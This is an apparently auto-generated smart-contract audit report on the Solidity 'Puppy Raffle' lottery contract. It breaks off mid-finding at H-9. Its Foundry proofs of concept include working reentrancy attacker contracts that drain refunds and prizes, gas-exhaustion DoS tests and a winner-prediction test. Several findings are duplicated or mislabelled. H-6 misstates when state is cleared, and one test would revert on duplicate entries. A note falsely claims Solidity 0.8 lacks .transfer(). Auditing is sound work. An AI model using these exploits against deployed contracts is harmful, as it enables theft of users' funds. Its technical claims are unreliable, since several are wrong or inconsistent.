# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### Puppy Raffle Protocol  
The Puppy Raffle is an on-chain, dog-themed lottery that mints an NFT and pays out ETH to one lucky participant every round.  

1. Joining  
• Anyone calls `enterRaffle(address[] newPlayers)` and pays `entranceFee × newPlayers.length`.  
• Each address may enter only once; duplicates revert.  
• Callers can batch-enter friends by supplying multiple addresses.  

2. Optional Exit  
• Before the draw, a player may invoke `refund(index)` to reclaim their fee and be marked inactive.  

3. Draw Conditions  
• After `raffleDuration` seconds from `raffleStartTime`, and if the minimum player count is met, `selectWinner()` can be executed by anyone.  

4. Winner Selection & Rewards  
• A pseudo-random index (block data ↦ players array) picks the winner.  
• Contract mints an ERC-721 dog NFT whose rarity, name and image URI are derived from internal mappings.  
• Prize pool = contract balance minus protocol fee; it is transferred to the winner.  

5. Fees & Admin  
• Each entry pays a small fee that accumulates in `totalFees`.  
• Owner can update `feeAddress` and later `withdrawFees()` when no active players exist.  

Built with Solidity 0.7.6 and Foundry, the contract is self-contained, upgrade-free, and ready for Ethereum mainnet or testnets.
## High Risk Findings
[H-1]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle
[H-2]. Randomness issue in PuppyRaffle::selectWinner
[H-3]. Reentrancy issue in PuppyRaffle::refund
[H-4]. DOS issue in PuppyRaffle::enterRaffle
[H-5]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner
[H-6]. Reentrancy issue in PuppyRaffle::selectWinner
[H-7]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
[H-8]. DOS issue in PuppyRaffle::refund
[H-9]. Array Limits issue in PuppyRaffle::selectWinner
[H-10]. Unchecked Return issue in PuppyRaffle::withdrawFees
[H-11]. Unchecked Return issue in PuppyRaffle::refund
## Medium Risk Findings
[M-1]. Unchecked Return issue in PuppyRaffle::withdrawFees
[M-2]. Integer Overflow issue in PuppyRaffle::selectWinner
[M-3]. Unexpected Eth issue in PuppyRaffle::withdrawFees
[M-4]. Pragma issue in PuppyRaffle::NA
[M-5]. Self-Destruct issue in PuppyRaffle::withdrawFees
[M-6]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::selectWinner
[M-7]. Array Limits issue in PuppyRaffle::refund
[M-8]. Unchecked Return issue in PuppyRaffle::withdrawFees
[M-9]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::enterRaffle
[M-10]. Integer Overflow issue in PuppyRaffle::enterRaffle
[M-11]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
[M-12]. Unchecked Return issue in PuppyRaffle::selectWinner
[M-13]. Reentrancy issue in PuppyRaffle::selectWinner
[M-14]. Zero Code issue in PuppyRaffle::refund
[M-15]. Gas Grief BlockLimit issue in PuppyRaffle::_isActivePlayer
[M-16]. Confidential Data issue in PuppyRaffle::changeFeeAddress
[M-17]. DOS issue in PuppyRaffle::withdrawFees
[M-18]. Zero Code issue in PuppyRaffle::enterRaffle
[M-19]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner
[M-20]. Array Limits issue in PuppyRaffle::enterRaffle
[M-21]. Delegatecall Low Level Ops issue in PuppyRaffle::selectWinner
## Low Risk Findings
[L-1]. Pragma issue in PuppyRaffle::NA
[L-2]. Event Consistency issue in PuppyRaffle::getActivePlayerIndex
[L-3]. Default Visibility issue in PuppyRaffle::getActivePlayerIndex
[L-4]. Event Consistency issue in PuppyRaffle::selectWinner
[L-5]. Integer Overflow/Math issue in PuppyRaffle::getActivePlayerIndex
[L-6]. Timestamp Dependent Logic issue in PuppyRaffle::enterRaffle
[L-7]. Unchecked Return issue in PuppyRaffle::selectWinner
[L-8]. Array Limits issue in PuppyRaffle::enterRaffle
[L-9]. Array Limits issue in PuppyRaffle::refund


### Number of Findings
- H: 11
- M: 21
- L: 9
- I: 0



# High Risk Findings

## [H-1]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function contains a nested loop that checks for duplicate players. This creates an O(n²) complexity that can lead to denial of service attacks. As the number of players grows, the gas cost increases quadratically, eventually hitting block gas limits. The vulnerable code is in the duplicate check section: `for (uint256 i = 0; i < players.length - 1; i++) { for (uint256 j = i + 1; j < players.length; j++) { require(players[i] != players[j], "PuppyRaffle: Duplicate player"); } }`

## Impact
Attackers can make the contract unusable by adding many players, causing subsequent entrance attempts to fail due to gas limits. This effectively breaks the raffle functionality.

## Proof of Concept
1. Attacker calls enterRaffle with a large number of addresses (e.g., 100+ addresses) 2. The nested loop checking for duplicates consumes massive gas 3. Future calls to enterRaffle with even small numbers of new players will fail due to gas limits 4. The raffle becomes unusable

## Proof of Code
function testDosAttack() public {
    // Create a large array of addresses
    address[] memory players = new address[](100);
    for (uint i = 0; i < 100; i++) {
        players[i] = address(uint160(i + 1));
    }
    
    // This will consume massive gas due to O(n²) duplicate check
    vm.deal(address(this), 100 ether);
    puppyRaffle.enterRaffle{value: 100 ether}(players);
    
    // Now trying to add even one more player will fail
    address[] memory newPlayer = new address[](1);
    newPlayer[0] = address(101);
    
    vm.deal(address(this), 1 ether);
    // This should fail due to gas limit
    vm.expectRevert();
    puppyRaffle.enterRaffle{value: 1 ether}(newPlayer);
}

## Suggested Mitigation
Use a mapping to track players instead of nested loops: `mapping(address => bool) public hasEntered;` and check duplicates in O(1) time: `require(!hasEntered[newPlayers[i]], "PuppyRaffle: Duplicate player"); hasEntered[newPlayers[i]] = true;`

## [H-2]. Randomness issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses predictable sources of randomness including `msg.sender`, `block.timestamp`, and `block.difficulty`. Miners can manipulate these values to influence the winner selection. The vulnerable code is: `uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;`

## Impact
Miners or sophisticated attackers can predict or manipulate the winner selection, allowing them to ensure they win the raffle unfairly.

## Proof of Concept
1. Attacker analyzes the randomness generation code 2. Attacker times their transaction to occur at a specific block timestamp 3. If the attacker is a miner, they can manipulate block.difficulty and block.timestamp 4. The attacker can predict the winner and ensure they win

## Proof of Code
function testPredictableRandomness() public {
    // Setup raffle with multiple players
    address[] memory players = new address[](4);
    players[0] = address(1);
    players[1] = address(2);
    players[2] = address(3);
    players[3] = address(4);
    
    vm.deal(address(this), 4 ether);
    puppyRaffle.enterRaffle{value: 4 ether}(players);
    
    // Fast forward time
    vm.warp(block.timestamp + duration + 1);
    
    // Predict the winner using the same formula
    uint256 predictedWinnerIndex = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 4;
    
    // Select winner
    puppyRaffle.selectWinner();
    
    // Verify our prediction was correct
    assertEq(puppyRaffle.previousWinner(), players[predictedWinnerIndex]);
}

## Suggested Mitigation
Use a verifiable random function (VRF) like Chainlink VRF: `import "@chainlink/contracts/src/v0.8/VRFConsumerBase.sol";` and implement proper randomness generation that cannot be manipulated by miners or users.

## [H-3]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function is vulnerable to reentrancy attacks. It uses `Address.sendValue()` to send ETH to the caller before updating the player's state to address(0). An attacker can create a malicious contract that calls `refund` again in its receive function. The vulnerable code is: `playerAddress.sendValue(entranceFee);` followed by `players[playerIndex] = address(0);`

## Impact
Attackers can drain the contract's funds by repeatedly calling refund before their player slot is set to address(0), receiving multiple refunds for a single entry.

## Proof of Concept
1. Attacker enters raffle with a malicious contract 2. Attacker calls refund() 3. In the receive function, the malicious contract calls refund() again 4. The check `playerAddress != address(0)` still passes because the state hasn't been updated yet 5. Attacker receives multiple refunds

## Proof of Code
contract MaliciousRefunder {
    PuppyRaffle puppyRaffle;
    uint256 public playerIndex;
    uint256 public refundCount;
    
    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }
    
    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: msg.value}(players);
        playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(playerIndex);
    }
    
    receive() external payable {
        if (refundCount < 3) {
            refundCount++;
            puppyRaffle.refund(playerIndex);
        }
    }
}

## Suggested Mitigation
Follow the checks-effects-interactions pattern. Update state before external calls: `players[playerIndex] = address(0);` before `playerAddress.sendValue(entranceFee);` or use OpenZeppelin's ReentrancyGuard modifier.

## [H-4]. DOS issue in PuppyRaffle::enterRaffle

## Description
The enterRaffle function contains a denial of service vulnerability due to unbounded gas consumption in the duplicate check. The function uses nested loops to check for duplicate players: for each new player, it iterates through all existing players and compares with all other existing players. This creates O(n²) complexity that can cause the transaction to run out of gas when the players array becomes large. The vulnerable code snippet:

```solidity
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}
```

## Impact
As the number of players grows, the gas cost increases quadratically, eventually making it impossible for new players to enter the raffle when the gas required exceeds the block gas limit. This effectively breaks the core functionality of the contract.

## Proof of Concept
1. Deploy the PuppyRaffle contract
2. Have multiple users enter the raffle until the players array reaches a significant size (e.g., 100+ players)
3. Attempt to add new players - the transaction will fail due to gas limit exceeded
4. The raffle becomes unusable for new participants

## Proof of Code
```solidity
function testDosAttack() public {
    // Fill the raffle with many players
    address[] memory manyPlayers = new address[](100);
    for (uint256 i = 0; i < 100; i++) {
        manyPlayers[i] = address(uint160(i + 1));
    }
    
    // This should work initially
    vm.deal(address(this), entranceFee * 100);
    puppyRaffle.enterRaffle{value: entranceFee * 100}(manyPlayers);
    
    // Now try to add more players - this will consume excessive gas
    address[] memory newPlayer = new address[](1);
    newPlayer[0] = address(0x999);
    
    vm.deal(address(this), entranceFee);
    // This will fail due to gas limit
    vm.expectRevert();
    puppyRaffle.enterRaffle{value: entranceFee}(newPlayer);
}
```

## Suggested Mitigation
Use a mapping to track player participation instead of nested loops:

```solidity
mapping(address => bool) public hasEntered;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        require(!hasEntered[newPlayers[i]], "PuppyRaffle: Duplicate player");
        hasEntered[newPlayers[i]] = true;
        players.push(newPlayers[i]);
    }
    emit RaffleEnter(newPlayers);
}
```

## [H-5]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner

## Description
The selectWinner function uses a combination of block values (timestamp, difficulty) and msg.sender to generate randomness, which is vulnerable to manipulation by miners and validators.

```solidity
function selectWinner() external {
    // ...
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    // ...
    uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
    // ...
}
```

## Impact
Miners/validators can manipulate block.timestamp and block.difficulty to influence the selection of winners and NFT rarity, potentially allowing them to win the raffle themselves or ensure specific participants win. This undermines the fairness of the raffle system and could lead to loss of user trust.

## Proof of Concept
1. A miner wants to win the raffle or ensure a specific address wins
2. The miner can manipulate block.timestamp slightly (within reasonable bounds)
3. The miner can compute the winner for different timestamps and difficulty values
4. When they find a combination that produces their desired winner, they can include that in their block
5. Similarly, they can influence the rarity of the NFT being minted

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RandomnessManipulationTest is Test {
    PuppyRaffle puppyRaffle;
    address[] players;
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
        
        // Add 4 players
        players.push(address(1));
        players.push(address(2));
        players.push(address(3));
        players.push(address(4));
        
        // Enter the raffle
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        
        // Advance time to end the raffle
        vm.warp(block.timestamp + 1 days);
    }
    
    function testManipulateRandomness() public {
        // Miner address
        address miner = address(0x1337);
        
        // Let the miner call selectWinner
        vm.prank(miner);
        
        // Manipulate block values to influence outcome
        // A miner could try different timestamps within reasonable bounds
        vm.warp(block.timestamp + 5); // Small adjustment
        vm.difficulty(1337);  // Manipulation of block.difficulty
        
        // This demonstrates the miner can influence the outcome
        // A real exploit would involve the miner computing the winning index
        // for different block values until they find one that makes them win
        puppyRaffle.selectWinner();
        
        // In a real scenario, the miner would compute this beforehand to ensure they win
        address winner = puppyRaffle.previousWinner();
        console.log("Winner: ", winner);
        
        // Change timestamp slightly and see different winner
        vm.warp(block.timestamp + 1);
        vm.difficulty(1338);
        
        // Restart the raffle with same players
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        vm.warp(block.timestamp + 1 days);
        puppyRaffle.selectWinner();
        
        address newWinner = puppyRaffle.previousWinner();
        console.log("New winner with different block values: ", newWinner);
        // With high likelihood, we'd see different winners based on small block value changes
    }
}

## Suggested Mitigation
Use a secure randomness source like Chainlink VRF (Verifiable Random Function) instead of block values:

```solidity
// Import Chainlink VRF interfaces
import "@chainlink/contracts/src/v0.7/interfaces/VRFCoordinatorV2Interface.sol";
import "@chainlink/contracts/src/v0.7/VRFConsumerBaseV2.sol";

contract PuppyRaffle is ERC721, Ownable, VRFConsumerBaseV2 {
    // Chainlink VRF variables
    VRFCoordinatorV2Interface private immutable i_vrfCoordinator;
    bytes32 private immutable i_gasLane;
    uint64 private immutable i_subscriptionId;
    uint32 private immutable i_callbackGasLimit;
    uint16 private constant REQUEST_CONFIRMATIONS = 3;
    uint32 private constant NUM_WORDS = 2;
    
    // Request to randomness mapping
    mapping(uint256 => address[]) private s_requestIdToPlayers;
    
    constructor(
        uint256 _entranceFee,
        address _feeAddress,
        uint256 _raffleDuration,
        address vrfCoordinatorV2,
        bytes32 gasLane,
        uint64 subscriptionId,
        uint32 callbackGasLimit
    ) ERC721("Puppy Raffle", "PR") VRFConsumerBaseV2(vrfCoordinatorV2) {
        // Original constructor code...
        
        // VRF initialization
        i_vrfCoordinator = VRFCoordinatorV2Interface(vrfCoordinatorV2);
        i_gasLane = gasLane;
        i_subscriptionId = subscriptionId;
        i_callbackGasLimit = callbackGasLimit;
    }
    
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        
        // Request random numbers from Chainlink VRF
        uint256 requestId = i_vrfCoordinator.requestRandomWords(
            i_gasLane,
            i_subscriptionId,
            REQUEST_CONFIRMATIONS,
            i_callbackGasLimit,
            NUM_WORDS
        );
        
        // Store current players array for this request
        s_requestIdToPlayers[requestId] = players;
        
        // Clear players array now
        delete players;
        raffleStartTime = block.timestamp;
    }
    
    // Callback function called by Chainlink VRF with random values
    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal override {
        address[] memory raffleParticipants = s_requestIdToPlayers[requestId];
        
        // Determine winner and rarity using secure randomness
        uint256 winnerIndex = randomWords[0] % raffleParticipants.length;
        uint256 rarity = randomWords[1] % 100;
        address winner = raffleParticipants[winnerIndex];
        
        // Rest of the winner selection logic...
        // Calculate prize, mint NFT, etc.
    }
}
```

## [H-6]. Reentrancy issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function is vulnerable to reentrancy attacks due to the external call to the winner before the contract state is updated. The function makes an external call to transfer ETH to the winner before updating critical state variables and clearing the players array:

```solidity
(bool success, ) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
_safeMint(winner, tokenId);
```

This call to `winner` allows a malicious contract to re-enter `selectWinner` or other functions before the state update, enabling theft of funds.

## Impact
An attacker can drain the contract's funds by reentering the selectWinner function or other vulnerable functions before the contract state is updated. Since the players array is not cleared until after the external call, the attacker could repeatedly claim the prize pool and mint tokens, stealing funds from legitimate users and disrupting the raffle functionality.

## Proof of Concept
1. Attacker creates a malicious contract with a fallback function that calls back into selectWinner
2. Attacker enters the raffle and manipulates it to ensure they win
3. When selectWinner is called, the prize is sent to the attacker's contract
4. The fallback function triggers and calls selectWinner again before players are cleared
5. Since state hasn't been updated, the attacker can claim the prize again
6. This can be repeated until the contract is drained of ETH

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

// Malicious contract that will perform the reentrancy attack
contract ReentrancyAttacker {
    PuppyRaffle public puppyRaffle;
    address public owner;
    uint256 public attackCount;
    uint256 public maxAttacks = 3; // Limit attacks to avoid test running out of gas
    
    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        owner = msg.sender;
    }
    
    // Function to start the attack
    function attack() external payable {
        // Enter the raffle
        address[] memory players = new address[](4);
        players[0] = address(this);
        players[1] = address(0x1);
        players[2] = address(0x2);
        players[3] = address(0x3);
        
        puppyRaffle.enterRaffle{value: msg.value}(players);
    }
    
    // Fallback function that executes when receiving ETH
    receive() external payable {
        attackCount++;
        if (attackCount < maxAttacks && address(puppyRaffle).balance >= 0.8 ether) {
            puppyRaffle.selectWinner(); // Reenter selectWinner
        }
    }
    
    // Withdraw stolen funds
    function withdraw() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
}

contract ReentrancyTest is Test {
    PuppyRaffle puppyRaffle;
    ReentrancyAttacker attacker;
    address user1 = address(0x1);
    address user2 = address(0x2);
    address user3 = address(0x3);
    address attackerEOA = address(0x4);
    uint256 entranceFee = 1e18;

    function setUp() public {
        // Initialize with 1 ETH entrance fee
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
        
        // Create the attacker contract
        vm.prank(attackerEOA);
        attacker = new ReentrancyAttacker(puppyRaffle);
        
        // Fund accounts
        vm.deal(attackerEOA, 10 ether);
        vm.deal(user1, 10 ether);
        vm.deal(user2, 10 ether);
        vm.deal(user3, 10 ether);
    }

    function testReentrancyAttack() public {
        // Initial balances
        uint256 initialAttackerBalance = attackerEOA.balance;
        
        // First, set up a normal raffle with some users
        address[] memory players = new address[](3);
        players[0] = user1;
        players[1] = user2;
        players[2] = user3;
        
        vm.prank(user1);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
        
        // Now the attacker enters the raffle
        vm.prank(attackerEOA);
        attacker.attack{value: entranceFee * 4}();
        
        // Advance time past raffle duration
        vm.warp(block.timestamp + 1 days + 1);
        
        // Manipulate to make attacker the winner (in a real attack, they could time their entry or use other methods)
        vm.roll(block.number + 1); // Manipulate randomness factors
        vm.txGasPrice(1); // Lower gas price to ensure our tx gets included
        
        // Trigger the attack
        vm.prank(attackerEOA);
        puppyRaffle.selectWinner();
        
        // Withdraw stolen funds
        vm.prank(attackerEOA);
        attacker.withdraw();
        
        // Check how much ETH the attacker gained
        uint256 finalAttackerBalance = attackerEOA.balance;
        uint256 puppyRaffleBalance = address(puppyRaffle).balance;
        
        console.log("Initial attacker balance:", initialAttackerBalance);
        console.log("Final attacker balance:", finalAttackerBalance);
        console.log("PuppyRaffle contract balance:", puppyRaffleBalance);
        console.log("Attacker profit:", finalAttackerBalance - initialAttackerBalance);
        
        // The attacker should have gained more ETH than they put in
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker didn't profit");
    }
}

## Suggested Mitigation
Apply the Check-Effects-Interactions pattern to prevent reentrancy. Update all state variables before making external calls. Additionally, consider adding a reentrancy guard.

```solidity
// Add a reentrancy guard
bool private _notEntered = true;

function selectWinner() external {
    require(_notEntered, "ReentrancyGuard: reentrant call");
    _notEntered = false;
    
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + uint64(fee);
    
    uint256 tokenId = totalSupply();
    
    // Determine rarity
    uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
    if (rarity <= COMMON_RARITY) {
        tokenIdToRarity[tokenId] = COMMON_RARITY;
    } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
        tokenIdToRarity[tokenId] = RARE_RARITY;
    } else {
        tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
    }

    // Update state BEFORE external calls
    address[] memory oldPlayers = players;
    delete players;
    raffleStartTime = block.timestamp;
    previousWinner = winner;
    
    // Make external calls AFTER state updates
    _safeMint(winner, tokenId);
    (bool success, ) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
    
    // Re-enable reentrancy guard
    _notEntered = true;
}
```

## [H-7]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
The `refund` function allows a player to get a refund, but it only sets their address to `address(0)` in the players array without adjusting the prizePool calculation. When `selectWinner` is called, it still counts these refunded players in the total prize pool calculation:

```solidity
function refund(uint256 playerIndex) public {
    // Code to check validity and refund
    players[playerIndex] = address(0);
    // Send refund
}

function selectWinner() external {
    // Later, prize calculation still uses full players array length
    uint256 totalAmountCollected = players.length * entranceFee;
    // Rest of function
}
```

This creates a discrepancy between the actual ETH in the contract and the calculated prize amount.

## Impact
When players get refunds, the contract loses ETH but still calculates prizes based on the total number of registered players (including refunded ones). This causes the contract to attempt to pay out more than it actually holds, potentially causing winner selection to fail and permanently locking all funds in the contract.

## Proof of Concept
1. Several players enter the raffle
2. Some players request refunds via the `refund` function
3. When `selectWinner` is called, it calculates the prize based on `players.length` which includes refunded players (now `address(0)`)
4. The calculated prize amount exceeds the actual ETH balance in the contract
5. The call to send the prize pool to the winner fails with: `PuppyRaffle: Failed to send prize pool to winner`
6. All funds are now permanently locked in the contract

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RefundExploitTest is Test {
    PuppyRaffle puppyRaffle;
    address player1 = address(0x1);
    address player2 = address(0x2);
    address player3 = address(0x3);
    address player4 = address(0x4);
    uint256 entranceFee = 1 ether;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
        vm.deal(player1, 1 ether);
        vm.deal(player2, 1 ether);
        vm.deal(player3, 1 ether);
        vm.deal(player4, 1 ether);
    }

    function testRefundLeadsToPrizeCalculationError() public {
        // 4 players enter the raffle
        address[] memory players = new address[](4);
        players[0] = player1;
        players[1] = player2;
        players[2] = player3;
        players[3] = player4;

        // Each player pays 1 ETH, so 4 ETH total
        vm.prank(player1);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        
        // Initial contract balance is 4 ETH
        assertEq(address(puppyRaffle).balance, 4 ether);
        
        // 2 players request refunds
        vm.prank(player2);
        puppyRaffle.refund(1);
        
        vm.prank(player3);
        puppyRaffle.refund(2);
        
        // After refunds, contract has 2 ETH left
        assertEq(address(puppyRaffle).balance, 2 ether);
        
        // But players array still has length 4 (two are address(0))
        assertEq(puppyRaffle.getActivePlayerIndex(player1), 0); // Still active
        assertEq(puppyRaffle.getActivePlayerIndex(player2), 0); // Now 0 (refunded)
        assertEq(puppyRaffle.getActivePlayerIndex(player3), 0); // Now 0 (refunded)
        assertEq(puppyRaffle.getActivePlayerIndex(player4), 3); // Still active
        
        // Wait for raffle to end
        vm.warp(block.timestamp + 1 days + 1);
        
        // This will calculate prize based on 4 players (4 ETH),
        // but contract only has 2 ETH remaining
        // Prize calculation: 4 ETH * 80% = 3.2 ETH
        // But contract only has 2 ETH
        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
        puppyRaffle.selectWinner();
        
        // Funds are now stuck in the contract
        assertEq(address(puppyRaffle).balance, 2 ether);
    }
}

## Suggested Mitigation
Track the actual number of active players separately from the array length. Add a counter that decrements when players are refunded:

```solidity
contract PuppyRaffle is ERC721, Ownable {
    // Add a counter for active players
    uint256 public activePlayerCount;
    
    function enterRaffle(address[] memory newPlayers) public payable {
        // Existing code...
        
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
            playerInRaffle[newPlayers[i]] = true;
        }
        
        // Increment active player count
        activePlayerCount += newPlayers.length;
        
        emit RaffleEnter(newPlayers);
    }
    
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
        
        // Mark as refunded
        players[playerIndex] = address(0);
        playerInRaffle[playerAddress] = false;
        
        // Decrement active player count
        activePlayerCount--;
        
        // Return funds
        payable(msg.sender).sendValue(entranceFee);
        
        emit RaffleRefunded(playerAddress);
    }
    
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(activePlayerCount >= 4, "PuppyRaffle: Need at least 4 active players");
        
        // Use activePlayerCount instead of players.length
        uint256 totalAmountCollected = activePlayerCount * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
        
        // Rest of function remains the same
    }
}
```

## [H-8]. DOS issue in PuppyRaffle::refund

## Description
The `refund` function sets the player's address to `address(0)` when they request a refund, but it does not reindex or update the array size. This creates a denial of service vulnerability in the `selectWinner` function.

Vulnerable code:
```solidity
function refund(uint256 playerIndex) public {
    // ... code to check if player is eligible for refund ...
    
    address playerAddress = players[playerIndex];
    // ... other checks ...
    
    // Critical issue: Setting to address(0) but not removing from array
    players[playerIndex] = address(0);
}
```

## Impact
As more players request refunds, the size of the players array remains unchanged but is increasingly filled with `address(0)` values. This bloats the array, increasing gas costs for operations that iterate over the array, such as checking for duplicates in `enterRaffle`. Eventually, if the array becomes too large, the gas cost to iterate through it could exceed the block gas limit, making it impossible to enter the raffle or select a winner.

## Proof of Concept
1. Many players enter the raffle, creating a large players array
2. Most of those players request refunds, filling the array with address(0) values
3. The players array remains large, but now mostly contains zero addresses
4. New players attempting to enter must check against all previous entries including the address(0) values
5. If enough refunds occur, the gas cost to check for duplicates exceeds block gas limit
6. The raffle becomes unusable as new players cannot enter and winner cannot be selected

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract DosRefundTest is Test {
    PuppyRaffle puppyRaffle;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(1 ether, address(this), 1 days);
    }
    
    function testDosViaRefunds() public {
        // Track initial gas for comparison
        uint256 startGas = gasleft();
        
        // Enter with 10 players
        address[] memory players = new address[](10);
        for (uint256 i = 0; i < 10; i++) {
            players[i] = address(uint160(i + 1)); // Create unique addresses
        }
        puppyRaffle.enterRaffle{value: 10 ether}(players);
        
        // Record gas used for initial entry
        uint256 initialEntryGas = startGas - gasleft();
        console.log("Gas used for initial entry:", initialEntryGas);
        
        // Have all players refund
        startGas = gasleft();
        for (uint256 i = 0; i < 10; i++) {
            // Need to use the correct player for each refund
            vm.prank(address(uint160(i + 1)));
            puppyRaffle.refund(i);
        }
        
        // Try to enter with 5 new players
        startGas = gasleft();
        address[] memory newPlayers = new address[](5);
        for (uint256 i = 0; i < 5; i++) {
            newPlayers[i] = address(uint160(i + 100)); // New unique addresses
        }
        puppyRaffle.enterRaffle{value: 5 ether}(newPlayers);
        
        // Record gas used for entry after refunds
        uint256 postRefundEntryGas = startGas - gasleft();
        console.log("Gas used for entry after refunds:", postRefundEntryGas);
        
        // Assert that gas cost increased significantly
        assertGt(postRefundEntryGas, initialEntryGas * 2, "Gas cost didn't increase as expected");
        
        // Demonstrate how this scales to make contract unusable
        console.log("With 100 refunded players, entry gas would be approximately:", 
                  (postRefundEntryGas * 10));
    }
}

## Suggested Mitigation
Replace the current refund implementation with one that properly removes the player from the array. One approach is to replace the refunded player with the last player in the array and then reduce the array length:

```solidity
function refund(uint256 playerIndex) public {
    require(playerIndex < players.length, "PuppyRaffle: Invalid player index");
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Send the refund
    payable(msg.sender).transfer(entranceFee);
    
    // Replace the refunded player with the last player in the array
    players[playerIndex] = players[players.length - 1];
    
    // Remove the last element (now a duplicate)
    players.pop();
    
    emit RaffleRefunded(playerAddress);
}
```

Note: If using Solidity 0.8.0 or later, you would need to adjust for the lack of `.transfer()` by using `Address.sendValue()`.

## [H-9]. Array Limits issue in PuppyRaffle::selectWinner

## Description
The `refund` function in the PuppyRaffle contract sets a player's address to `address(0)` but doesn't reduce the array size, leaving gaps in the players array. When the `selectWinner` function is called, it uses a modulo operation on the array length to determine the winner index, but this includes the `address(0)` entries. This creates a situation where an address that doesn't exist (address(0)) can be selected as the winner, potentially causing funds to be lost.

```solidity
function refund(uint256 playerIndex) public {
    require(players[playerIndex] == msg.sender, "PuppyRaffle: Only the player can refund");
    require(players[playerIndex] != address(0), "PuppyRaffle: Player already refunded, or is not active");

    payable(msg.sender).sendValue(entranceFee);

    players[playerIndex] = address(0);
    emit RaffleRefunded(msg.sender);
}

function selectWinner() external {
    // ... code omitted ...
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    // ... code omitted ...
}
```

## Impact
If `address(0)` is selected as the winner (which can happen if players request refunds), the prize pool would be sent to the zero address, permanently locking the funds. This could result in a loss of assets for the protocol and undermine the fairness of the raffle system.

## Proof of Concept
